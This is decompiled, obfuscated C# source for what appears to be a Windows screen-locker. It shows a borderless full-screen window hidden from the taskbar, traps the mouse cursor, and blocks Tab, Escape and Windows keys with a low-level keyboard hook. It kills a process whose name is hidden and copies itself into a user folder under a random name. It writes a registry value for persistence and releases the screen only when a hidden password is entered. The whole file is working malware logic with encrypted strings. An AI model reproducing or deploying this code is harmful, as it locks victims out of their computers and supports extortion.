using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

public class c : Form
{
	private e.j m_a;

	private e.j m_b;

	private static int m_c;

	private static int m_d;

	private static string m_e = Environment.UserName;

	private static string m_f = Environment.MachineName.ToString();

	private static string m_g = _003CModule_003E.c(33112, (int)((nint)Type.EmptyTypes.LongLength + 36872), (int)((nint)Type.EmptyTypes.LongLength + 254));

	private IContainer m_h = null;

	private Label m_i;

	private Label m_j;

	private Label m_k;

	private TextBox m_l;

	private Button m_m;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ExStyle(createParams.get_ExStyle() | 0x80);
			return createParams;
		}
	}

	public c()
	{
		m();
	}

	private void a(object sender, EventArgs e)
	{
		((Form)this).set_ShowInTaskbar(false);
		((Control)this.m_i).set_BackColor(Color.Transparent);
		((Control)this.m_j).set_BackColor(Color.Transparent);
		((Control)this.m_k).set_BackColor(Color.Transparent);
		j();
		h();
		global::b.a();
	}

	private unsafe void b(object sender, EventArgs e)
	{
		string text = ((Control)this.m_l).get_Text();
		int int_ = sizeof(ulong) + 48582;
		int n = _003CModule_003E.n;
		if (text == _003CModule_003E.c(int_, (3693 + -1073741824 * n == 1356446369) ? (sizeof(uint) + 294054568) : 51911, sizeof(uint) + 221))
		{
			i();
			Environment.Exit(-1);
		}
	}

	private void c()
	{
		Rectangle rectangle = ((Control)this).RectangleToScreen(((Control)this).get_ClientRectangle());
		e.g g_ = default(e.g);
		g_.a = rectangle.Left;
		g_.b = rectangle.Top;
		g_.c = rectangle.Right;
		g_.d = rectangle.Bottom;
		global::e.ClipCursor(ref g_);
		global::e.SetActiveWindow(((Control)this).get_Handle());
		global::e.SetForegroundWindow(((Control)this).get_Handle());
	}

	public unsafe static int d(int int_0, IntPtr intptr_0, IntPtr intptr_1)
	{
		int num2;
		int num7 = default(int);
		if (int_0 < 0)
		{
			int num = _003CModule_003E.i;
			_003CModule_003E.e = _003CModule_003E.c((int)(((int)(262144 * ((uint)num >> 18)) - -553648128 != num) ? ((nint)Type.EmptyTypes.LongLength + 40883) : (sizeof(long) + -1288447620)), 44229, sizeof(int) + 248);
			_003CModule_003E.d = 1386028750;
			num2 = global::e.CallNextHookEx(global::c.m_d, int_0, intptr_0, intptr_1);
		}
		else
		{
			int num3 = default(int);
			_003CModule_003E.h = num3;
			int num4 = (int)intptr_0;
			int num5 = num4;
			int num6 = num5 - 256;
			_003CModule_003E.j = num7;
			if ((uint)num6 > 1u)
			{
				if ((uint)(num5 - 260) > 3u)
				{
					goto IL_00cd;
				}
				_003CModule_003E.j = num3;
				num2 = 1;
			}
			else
			{
				num7 = Marshal.ReadInt32(intptr_1);
				num3 = num7;
				if (num3 != 9 && num3 != 27 && (uint)(num3 - 91) > 1u)
				{
					goto IL_00cd;
				}
				num2 = 1;
			}
		}
		goto IL_00e9;
		IL_00e9:
		int result = num2;
		int num8 = num7;
		_003CModule_003E.i = num2;
		_003CModule_003E.f = num8;
		return result;
		IL_00cd:
		_003CModule_003E.o = -1143203221;
		num2 = global::e.CallNextHookEx(global::c.m_d, int_0, intptr_0, intptr_1);
		goto IL_00e9;
	}

	public unsafe void e()
	{
		string text = global::c.m_g + global::c.m_e + _003CModule_003E.c(sizeof(short) + 3100, (int)((nint)Type.EmptyTypes.LongLength + 2369), (int)((nint)Type.EmptyTypes.LongLength + 40));
		_003CModule_003E.p = -1871252905;
		_003CModule_003E.l = 850361962;
		string[] array = new string[5];
		string text2 = global::c.m_g;
		_003CModule_003E.l = -1734065372;
		array[0] = text2;
		array[1] = global::c.m_e;
		int num = global::a.c;
		nint num2;
		int num3 = default(int);
		int num4 = default(int);
		int num5 = default(int);
		if ((num << 11) - -671088640 == (int)(134217728 * ((uint)num / 65536u)))
		{
			num2 = (nint)Type.EmptyTypes.LongLength + 1361453182;
		}
		else
		{
			num3 = global::a.c;
			if ((((uint)num3 ^ (1024 * ((uint)num3 >> 10))) & 0xC4800000u) != 0)
			{
				if (46 * (num4 << 17) + 18 * (num4 << 17) != 7498)
				{
					num2 = 148867418;
				}
				else
				{
					num5 = -1168010040;
					num2 = -1168010040;
				}
			}
			else if (((~((num & 0x6FB545D8) - 1875) ^ 0x14BD) & 3) == 3)
			{
				num2 = (nint)Type.EmptyTypes.LongLength + 35210;
			}
			else if ((num3 & 0x10EB) + -3249 == num3 - -3450)
			{
				num4 = _003CModule_003E.i;
				num2 = (((0x1153 ^ (3 * num4 + ((num3 * -599588864) & num4) + num4 + 153)) == 0) ? ((nint)Type.EmptyTypes.LongLength + -734184363) : (((int)((uint)(748928 * num3) >> 5) - -3650 == 3 * num3 + 5 * num3 + 4577) ? ((nint)Type.EmptyTypes.LongLength + -1838067864) : (sizeof(Guid) + -1924309817)));
			}
			else
			{
				num2 = sizeof(int) + -954474247;
			}
		}
		array[2] = _003CModule_003E.c(32570, (int)num2, (int)((nint)Type.EmptyTypes.LongLength + 193));
		array[3] = f(10);
		nint num6 = (nint)Type.EmptyTypes.LongLength + 71124;
		int num7 = _003CModule_003E.k;
		array[4] = _003CModule_003E.c((int)num6, (int)((((num7 * -536870912) & 0x20000000) == (0x20000000 & (num7 << 29))) ? ((nint)Type.EmptyTypes.LongLength + 70453) : ((nint)Type.EmptyTypes.LongLength + 1199365734)), (int)((nint)Type.EmptyTypes.LongLength + 191));
		string text3 = string.Concat(array);
		if (!Directory.Exists(text))
		{
			Directory.CreateDirectory(text);
		}
		else if (File.Exists(text3))
		{
			_003CModule_003E.n = 1654087594;
			_003CModule_003E.p = 828233320;
			File.Delete(text3);
		}
		string text4 = _003CModule_003E.c(11930, (int)(((0x7B3u ^ (uint)(1323325018 * num3)) != 0) ? ((nint)Type.EmptyTypes.LongLength + 14924) : (((((uint)num3 / 2356u) | ((uint)(num3 << 13) % 24u)) == 1446639404) ? (((0x201E68u ^ ((uint)num4 % 524288u)) != 0) ? ((nint)Type.EmptyTypes.LongLength + -1876937194) : (sizeof(ushort) + 878115951)) : ((~(0x8F7 | (num5 * 67 + 61 * num5) | num5) == num5) ? 2111336103 : ((nint)Type.EmptyTypes.LongLength + 1356815329)))), (int)((nint)Type.EmptyTypes.LongLength + 70));
		string processName = Process.GetCurrentProcess().ProcessName;
		string text5 = _003CModule_003E.c(sizeof(double) + 18786, 17161, (int)((nint)Type.EmptyTypes.LongLength + 9));
		global::a.c = -1020138379;
		string text6 = text4 + processName + text5;
		nint num8 = (nint)Type.EmptyTypes.LongLength + 41334;
		nint num9 = (nint)Type.EmptyTypes.LongLength + 43826;
		int o = _003CModule_003E.o;
		int num10;
		nint num11;
		if (~((-1397 + o * 749731840) * 2) != ((o << 17) ^ 0x1A09))
		{
			num10 = 230;
			num11 = num10;
		}
		else if (16384 * ((0x1FFEAE0 & o) - 9047) - -588709888 != (o ^ o))
		{
			if ((0x20 & (num7 + 1037206976 << 5)) == (0x20 & (104160 * num7)))
			{
				if (o * 102 + 1946 * o == 2851)
				{
					num10 = -1668808652;
					num11 = num10;
				}
				else
				{
					num10 = -1087834485;
					num11 = num10;
				}
			}
			else
			{
				num10 = 1706380069;
				num11 = num10;
			}
		}
		else
		{
			num11 = (nint)Type.EmptyTypes.LongLength + -883082793;
		}
		global::a.b = _003CModule_003E.c((int)num8, (int)num9, (int)num11);
		string text7 = text6;
		string text8 = Directory.GetCurrentDirectory() + text7;
		string sourceFileName = text8;
		File.Move(sourceFileName, text3);
		if (!k(_003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 61025), 64468, sizeof(ulong) + 83), text))
		{
			l(_003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 14902), (int)((nint)Type.EmptyTypes.LongLength + 14364), (int)((nint)Type.EmptyTypes.LongLength + 200)), text3);
		}
	}

	public unsafe static string f(int int_0)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < int_0--)
		{
			int n = _003CModule_003E.n;
			stringBuilder.Append(_003CModule_003E.c((int)(((((uint)(n * 62 + n * 194) % 12713036u) | 0xFFFFFF) == 16777215) ? (sizeof(int) + 41047) : ((nint)Type.EmptyTypes.LongLength + 1211246446)), sizeof(double) + 43552, 150)[random.Next(_003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 46030), (int)((nint)Type.EmptyTypes.LongLength + 48606), (int)((nint)Type.EmptyTypes.LongLength + 156)).Length)]);
		}
		return stringBuilder.ToString();
	}

	private unsafe void g()
	{
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0158: Unknown result type (might be due to invalid IL or missing references)
		bool flag;
		if (flag = global::c.m_d == 0)
		{
			_003CModule_003E.d = null;
			_003CModule_003E.i = 1460107185;
			this.m_b = d;
			_003CModule_003E.b = null;
			_003CModule_003E.p = -1186876474;
			global::c.m_d = global::e.SetWindowsHookEx(13, this.m_b, (IntPtr)0, 0);
			int num = global::c.m_d;
			_003CModule_003E.l = -1557401652;
			bool flag2;
			if (flag2 = num == 0)
			{
				nint num2 = (nint)Type.EmptyTypes.LongLength + 41115;
				int num3 = _003CModule_003E.m;
				MessageBox.Show(_003CModule_003E.c((int)num2, (int)(((num3 << 14) - ((num3 << 20) + 8963) != 1337634196) ? ((nint)Type.EmptyTypes.LongLength + 43414) : 2083461682), sizeof(float) + 81));
				global::k.c = 1876936332;
			}
		}
		else
		{
			bool num4 = !global::e.UnhookWindowsHookEx(global::c.m_d);
			global::a.c = 1503776956;
			_003CModule_003E.g = flag;
			global::k.c = null;
			bool flag3 = num4;
			bool flag2 = default(bool);
			global::m.a = flag2;
			if (flag3)
			{
				int num3 = default(int);
				MessageBox.Show(_003CModule_003E.c((int)((118160 + num3 + num3 * 255 != (num3 << 15) - 6417) ? (sizeof(ushort) + 36630) : ((nint)Type.EmptyTypes.LongLength + -1404223160)), 40182, 161));
			}
			else
			{
				global::c.m_d = 0;
			}
		}
	}

	private unsafe void h()
	{
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		int num = 0;
		bool flag = default(bool);
		while (true)
		{
			int num2 = num;
			int num3 = array.Length;
			_003CModule_003E.h = -563903361;
			_003CModule_003E.e = 1818084011;
			if (num2 >= num3)
			{
				break;
			}
			int num4 = num;
			_003CModule_003E.c = num;
			Process process = array[num4];
			try
			{
				nint intPtr = ((num * -1667235840 != -9402) ? (sizeof(Guid) + 19403) : (((((11 * num + num * 21) & 0x93E) | -4306) == -4306) ? ((nint)Type.EmptyTypes.LongLength + -1774048010) : ((nint)Type.EmptyTypes.LongLength + 1130328845)));
				nint num5;
				if ((0xF & ~(num * 120 + 8 * num)) != 15)
				{
					num5 = ((num * 454 + num * 58 - -469762048 != (num ^ 0x10C1) << 9) ? (sizeof(short) + -1662734877) : ((((uint)(1420 * num + 5286 + 628 * num) >> 11) + 7921 == (uint)num) ? (-1895141614) : ((nint)Type.EmptyTypes.LongLength + -1692412010)));
				}
				else if ((((uint)(num * 264 + num * 1784) >> 5 >> 6) & 1) != (uint)(1 & -num))
				{
					num5 = (nint)Type.EmptyTypes.LongLength + 1538822975;
				}
				else if (-553648128 + (0xA5 ^ num) == num)
				{
					num5 = (nint)Type.EmptyTypes.LongLength + -961780388;
				}
				else
				{
					int n = _003CModule_003E.n;
					int num6 = n * 1046723648 - 3578 - 266528;
					int num7 = _003CModule_003E.h;
					if (num6 != (8 * num7 + 8 * num7) * 4)
					{
						int num8 = _003CModule_003E.i;
						num5 = ((-(609664 * num8) == 6337) ? (-1635659423) : ((nint)Type.EmptyTypes.LongLength + 177));
					}
					else
					{
						num5 = (nint)Type.EmptyTypes.LongLength + 1146000540;
					}
				}
				global::a.b = _003CModule_003E.c(15868, (int)intPtr, (int)num5);
				_003CModule_003E.g = null;
				string text = process.ProcessName.ToLower().Trim();
				_003CModule_003E.p = -1980982856;
				if (flag = text == _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 33209), (int)((nint)Type.EmptyTypes.LongLength + 36925), (int)((nint)Type.EmptyTypes.LongLength + 218)))
				{
					process.Kill();
					_003CModule_003E.a = process;
				}
			}
			catch
			{
			}
			_003CModule_003E.a = null;
			int num9 = num;
			_003CModule_003E.a = flag;
			num = num9 + 1;
		}
		c();
		g();
	}

	private void i()
	{
		global::e.ClipCursor_1(IntPtr.Zero);
		g();
	}

	private void j()
	{
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_WindowState((FormWindowState)2);
	}

	public unsafe static bool k(string string_0, string string_1)
	{
		int num = default(int);
		try
		{
			RegistryKey localMachine = Registry.LocalMachine;
			num = _003CModule_003E.h;
			RegistryKey registryKey = localMachine.OpenSubKey(_003CModule_003E.c((int)(((int)((uint)num % 8192u) - -1809049735 == -7634) ? ((nint)Type.EmptyTypes.LongLength + 1987415959) : (sizeof(long) + 56876)), sizeof(short) + 60639, (int)((nint)Type.EmptyTypes.LongLength + 240)), writable: true);
			string text = registryKey.GetValue(string_0)!.ToString();
			if (text == null)
			{
				return false;
			}
			bool flag = default(bool);
			global::a.b = flag;
			if (!text.ToLower().Equals(string_1.ToLower()))
			{
				return false;
			}
			_003CModule_003E.h = 151944843;
			return true;
		}
		catch (Exception)
		{
		}
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(_003CModule_003E.c((int)((num * 85 + 43 * num == 974290426) ? ((nint)Type.EmptyTypes.LongLength + 435987719) : ((nint)Type.EmptyTypes.LongLength + 9140)), sizeof(int) + 11890, (int)((nint)Type.EmptyTypes.LongLength + 71)), writable: true);
			string text = registryKey.GetValue(string_0)!.ToString();
			bool num2 = text == null;
			_003CModule_003E.e = 1957620381;
			if (num2)
			{
				return false;
			}
			string text2 = text.ToLower();
			_003CModule_003E.k = 2071185029;
			bool flag;
			if (flag = !text2.Equals(string_1.ToLower()))
			{
				return false;
			}
			return true;
		}
		catch (Exception)
		{
		}
		return false;
	}

	private unsafe bool l(string string_0, string string_1)
	{
		try
		{
			RegistryKey localMachine = Registry.LocalMachine;
			int num = _003CModule_003E.l;
			RegistryKey registryKey = localMachine.OpenSubKey(_003CModule_003E.c(16941, 20610, ((uint)(4 * num + 4 * num) / 14u != 2786394406u) ? 119 : 1185638184), writable: true);
			registryKey.SetValue(string_0, string_1);
			return true;
		}
		catch (Exception)
		{
		}
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(_003CModule_003E.c(65773, sizeof(ulong) + 67997, sizeof(long) + 149), writable: true);
			registryKey.SetValue(string_0, string_1);
		}
		catch (Exception)
		{
			return false;
		}
		return true;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && this.m_h != null)
		{
			this.m_h.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private unsafe void m()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_0041: Expected O, but got Unknown
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		//IL_0091: Expected O, but got Unknown
		//IL_0196: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a0: Expected O, but got Unknown
		//IL_032b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0335: Expected O, but got Unknown
		this.m_i = new Label();
		this.m_j = new Label();
		_003CModule_003E.p = 1258415768;
		this.m_k = new Label();
		this.m_l = new TextBox();
		this.m_m = new Button();
		((Control)this).SuspendLayout();
		((Control)this.m_i).set_AutoSize(true);
		((Control)this.m_i).set_Font(new Font(_003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 46239), (int)((nint)Type.EmptyTypes.LongLength + 48858), (int)((nint)Type.EmptyTypes.LongLength + 13)), 48f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)this.m_i).set_ForeColor(Color.Red);
		((Control)this.m_i).set_Location(new Point(12, 9));
		((Control)this.m_i).set_Name(_003CModule_003E.c(66529, (int)((nint)Type.EmptyTypes.LongLength + 69363), 229));
		((Control)this.m_i).set_Size(new Size(338, 73));
		global::m.a = null;
		((Control)this.m_i).set_TabIndex(0);
		Label obj = this.m_i;
		nint num = (nint)Type.EmptyTypes.LongLength + 40752;
		int num2 = _003CModule_003E.j;
		((Control)obj).set_Text(_003CModule_003E.c((int)num, 43903, ((((uint)num2 % 529236488u) | 0x7FFFFFFF) == int.MaxValue) ? (sizeof(short) + 97) : (sizeof(int) + 1676776258)));
		((Control)this.m_j).set_AutoSize(true);
		((Control)this.m_j).set_Font(new Font(_003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 26771), sizeof(ulong) + 25207, (int)((nint)Type.EmptyTypes.LongLength + 31)), 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)this.m_j).set_ForeColor(Color.Red);
		_003CModule_003E.p = 1949920239;
		((Control)this.m_j).set_Location(new Point(12, 94));
		((Control)this.m_j).set_Name(_003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 20066), 23715, ((0x54F & (num2 * 984 + 6285 + num2 * 1064)) == 13) ? (sizeof(float) + 236) : (sizeof(ushort) + 1364493203)));
		((Control)this.m_j).set_Size(new Size(343, 25));
		((Control)this.m_j).set_TabIndex(1);
		global::k.c = null;
		((Control)this.m_j).set_Text(_003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 71295), (int)((nint)Type.EmptyTypes.LongLength + 71201), (int)(((0x78 & (num2 * 38 + num2 * 90)) == 0) ? ((nint)Type.EmptyTypes.LongLength + 99) : (sizeof(byte) + -1764511083))));
		((Control)this.m_k).set_AutoSize(true);
		Label obj2 = this.m_k;
		nint num3 = (nint)Type.EmptyTypes.LongLength + 8890;
		int num4 = _003CModule_003E.k;
		((Control)obj2).set_Font(new Font(_003CModule_003E.c((int)num3, (int)((((4096 * num4) | -12) == -12) ? (sizeof(double) + 10861) : (((uint)num2 / 134217728u - 565182464 == (uint)(131072 * num2 * 1697536)) ? ((nint)Type.EmptyTypes.LongLength + -1248140325) : ((nint)Type.EmptyTypes.LongLength + 765078657))), (int)((nint)Type.EmptyTypes.LongLength + 56)), 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)this.m_k).set_ForeColor(Color.Red);
		Label obj3 = this.m_k;
		_003CModule_003E.p = 345037023;
		((Control)obj3).set_Location(new Point(12, 128));
		((Control)this.m_k).set_Name(_003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 52627), (int)((nint)Type.EmptyTypes.LongLength + 50467), 0));
		((Control)this.m_k).set_Size(new Size(600, 50));
		((Control)this.m_k).set_TabIndex(2);
		((Control)this.m_k).set_Text(_003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 65882), (int)((nint)Type.EmptyTypes.LongLength + 69959), 9));
		((Control)this.m_l).set_Location(new Point(12, 181));
		_003CModule_003E.h = 2134890358;
		((Control)this.m_l).set_Name(_003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 61133), (int)((nint)Type.EmptyTypes.LongLength + 65207), (num4 * -1173880832 == 6427) ? (-1980303696) : 246));
		TextBox obj4 = this.m_l;
		Size size = new Size(281, 20);
		_003CModule_003E.p = -1091718226;
		((Control)obj4).set_Size(size);
		((Control)this.m_l).set_TabIndex(3);
		((Control)this.m_m).set_Location(new Point(12, 207));
		((Control)this.m_m).set_Name(_003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 47761), (int)((nint)Type.EmptyTypes.LongLength + 45498), (int)(((-num2 & 1) != (1 & -(-5567 & num2))) ? ((nint)Type.EmptyTypes.LongLength + -1586592028) : ((nint)Type.EmptyTypes.LongLength + 66))));
		((Control)this.m_m).set_Size(new Size(281, 23));
		((Control)this.m_m).set_TabIndex(4);
		((Control)this.m_m).set_Text(_003CModule_003E.c(sizeof(int) + 7452, sizeof(byte) + 5411, (int)((((2404864 * num2) | -310) == -310) ? ((nint)Type.EmptyTypes.LongLength + 39) : (sizeof(int) + 1545639108))));
		((ButtonBase)this.m_m).set_UseVisualStyleBackColor(true);
		Button obj5 = this.m_m;
		_003CModule_003E.m = -814077312;
		_003CModule_003E.c = _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 60592), (int)((((2 * num4) | -2) != -2) ? ((nint)Type.EmptyTypes.LongLength + 1307724207) : 58637), 154);
		((Control)obj5).add_Click((EventHandler)b);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)(object)global::k.c);
		((Form)this).set_ClientSize(new Size(1125, 617));
		((Control)this).get_Controls().Add((Control)(object)this.m_m);
		((Control)this).get_Controls().Add((Control)(object)this.m_l);
		((Control)this).get_Controls().Add((Control)(object)this.m_k);
		((Control)this).get_Controls().Add((Control)(object)this.m_j);
		((Control)this).get_Controls().Add((Control)(object)this.m_i);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name(_003CModule_003E.c(66097, 68007, (int)((nint)Type.EmptyTypes.LongLength + 171)));
		int int_ = sizeof(Guid) + 13350;
		nint num5 = (nint)Type.EmptyTypes.LongLength + 15305;
		int num6 = -3911 & num2;
		int num7 = global::a.c;
		nint num9;
		if (((uint)(num6 + 28913664 * num7) ^ 0x1EF6u) != 0)
		{
			int num8 = _003CModule_003E.j;
			num9 = (((((uint)num8 >> 12) % 917991u >> 1) - 268435456 != (uint)num8 / 14885199u) ? ((nint)Type.EmptyTypes.LongLength + 138) : ((num7 - 6948 - 4482 != (int)((uint)(num7 << 7) >> 7)) ? ((nint)Type.EmptyTypes.LongLength + -1439604096) : (sizeof(double) + 1725204709)));
		}
		else
		{
			num9 = sizeof(Guid) + 1035715898;
		}
		((Control)this).set_Text(_003CModule_003E.c(int_, (int)num5, (int)num9));
		((Form)this).add_Load((EventHandler)a);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
